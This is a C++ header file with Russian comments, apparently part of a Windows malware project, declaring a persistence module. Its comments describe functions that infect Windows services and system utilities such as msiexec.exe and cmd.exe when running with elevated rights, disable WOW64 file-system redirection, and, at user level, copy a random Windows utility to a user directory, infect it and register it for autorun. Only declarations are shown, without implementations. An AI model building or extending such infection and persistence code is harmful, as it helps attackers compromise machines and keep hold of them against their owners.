#pragma once

#include "global.hpp"

#include "preprocessing.hpp"
#include "service.hpp"
#include "access.hpp"

// содержит функции для установки закрепа в зависимости от прав - elevated ( >= High integrity level), userland ( <= medium integrity level )

namespace elevated_persistence
{
	typedef BOOL(WINAPI *fnIsWow64Process)(HANDLE, PBOOL);
	typedef BOOL(WINAPI *fnWow64DisableWow64FsRedirection)(PVOID*);
	typedef BOOL(WINAPI *fnWow64RevertWow64FsRedirection)(PVOID);

	// заражает службы
	BOOL service(capsidProcessingForm *cpf);
	// заражает разного рода утилиты если возможно (например, msiexec.exe, cmd.exe и т.д)
	BOOL tools(capsidProcessingForm *cpf);

	// выполняет все функции выше, а также делает необходимые приготовления для x86 приложений - отключает редирект WOW64
	BOOL exec_all(capsidProcessingForm *cpf);
}

namespace userland_persisence
{
	// выбирает случайную утилиту из папки Windows, переносит ее в userland директорию, заражает и ставит на автозапуск
	BOOL relocate(capsidProcessingForm *cpf);
}

BOOL exec_persistence(capsidProcessingForm *cpf);